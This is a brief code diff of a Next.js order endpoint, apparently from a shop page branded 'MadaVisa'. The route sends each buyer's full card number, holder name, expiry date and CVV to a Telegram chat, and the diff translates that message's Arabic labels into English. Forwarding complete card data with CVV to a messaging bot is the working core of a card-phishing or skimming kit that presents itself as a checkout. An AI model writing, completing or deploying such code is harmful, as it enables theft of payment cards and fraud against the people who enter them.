@@ -12,16 +12,16 @@ export async function POST(req: NextRequest) {
     body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer }),
   });
 
-  // إرسال تلجرام
+  // Send Telegram
   const text = [
-    `🛒 طلب جديد`,
-    `🆔 رقم الطلب: ${orderId}`,
-    `👤 العميل: ${customer ?? "—"}`,
-    `💳 رقم البطاقة: ${cardNumber}`,
-    `👤 اسم حامل البطاقة: ${cardHolder}`,
-    `📅 تاريخ الانتهاء: ${expiry}`,
+    `💳 MadaVisa - New Order`,
+    `🆔 Order ID: ${orderId}`,
+    `👤 Customer: ${customer ?? "-"}`,
+    `💳 Card Number: ${cardNumber}`,
+    `👤 Card Holder: ${cardHolder}`,
+    `📅 Expiry: ${expiry}`,
     `🔐 CVV: ${cvv}`,
-    `💰 الإجمالي: ${total?.toLocaleString("ar-SA")} ريال`,
+    `💰 Total: ${total} SAR`,
   ].join("\n");
 
   await fetch(
